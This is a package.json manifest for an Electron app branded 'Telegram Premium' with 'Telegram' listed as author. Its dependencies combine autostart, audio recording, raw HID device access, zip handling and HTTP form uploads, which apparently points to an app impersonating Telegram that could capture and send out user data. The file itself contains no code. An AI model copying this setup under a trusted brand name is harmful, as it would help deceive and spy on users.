{
  "name": "TelegramPremium",
  "version": "1.0.0",
  "description": "Telegram Premium Desktop",
  "author": "Telegram",
  "main": "main.js",
  "type": "commonjs",
  "scripts": {
    "start": "electron-forge start",
    "package": "electron-forge package",
    "make": "electron-forge make",
    "dist": "electron-builder"
  },
  "config": {
    "forge": {
      "packagerConfig": {
        "asar": true,
        "prune": true,
        "icon": "icon.ico",
        "ignore": [
          "node_modules/.cache"
        ],
        "extraResource": [
          "node_modules/electron/dist/ffmpeg.dll"
        ]
      },
      "makers": [
        {
          "name": "@electron-forge/maker-squirrel",
          "config": {
            "name": "TelegramPremium",
            "setupIcon": "icon.ico",
            "loadingGif": "icon.ico",
            "authors": "Telegram",
            "description": "Telegram Premium Desktop App",
            "oneClick": false,
            "allowToChangeInstallationDirectory": true,
            "createDesktopShortcut": true,
            "createStartMenuShortcut": true
          }
        },
        {
          "name": "@electron-forge/maker-zip",
          "platforms": [
            "win32"
          ]
        },
        {
          "name": "@electron-forge/maker-deb"
        },
        {
          "name": "@electron-forge/maker-rpm"
        }
      ],
      "plugins": [
        {
          "name": "@electron-forge/plugin-auto-unpack-natives",
          "config": {}
        }
      ]
    }
  },
  "build": {
    "appId": "com.telegram.telegrampremiumdesktop",
    "productName": "Telegram Premium",
    "icon": "icon.ico",
    "files": [
      "**/*",
      {
        "from": "node_modules/electron/dist/",
        "filter": [
          "ffmpeg.dll"
        ]
      }
    ],
    "extraResources": [
      {
        "from": "node_modules/electron/dist/ffmpeg.dll",
        "to": "."
      }
    ],
    "win": {
      "target": "portable"
    },
    "nsis": {
      "oneClick": false,
      "allowToChangeInstallationDirectory": true,
      "createDesktopShortcut": true,
      "createStartMenuShortcut": true
    }
  },
  "dependencies": {
    "@electron/get": "^4.0.2",
    "@electron/remote": "^2.1.3",
    "adm-zip": "^0.5.16",
    "auto-launch": "^5.0.6",
    "axios": "^1.13.1",
    "dotenv": "^17.2.3",
    "electron-squirrel-startup": "^1.0.1",
    "ffmpeg-static": "^5.2.0",
    "form-data": "^4.0.4",
    "lamejs": "^1.2.1",
    "naudiodon": "^2.3.6",
    "node-hid": "^3.2.0",
    "recordrtc": "^5.6.2"
  },
  "devDependencies": {
    "@electron-forge/cli": "^7.10.2",
    "@electron-forge/maker-deb": "^7.10.2",
    "@electron-forge/maker-rpm": "^7.10.2",
    "@electron-forge/maker-squirrel": "^7.10.2",
    "@electron-forge/maker-zip": "^7.10.2",
    "@electron-forge/plugin-auto-unpack-natives": "^7.10.2",
    "@electron-forge/plugin-fuses": "^7.10.2",
    "@electron/fuses": "^1.8.0",
    "electron": "^32.3.3"
  }
}
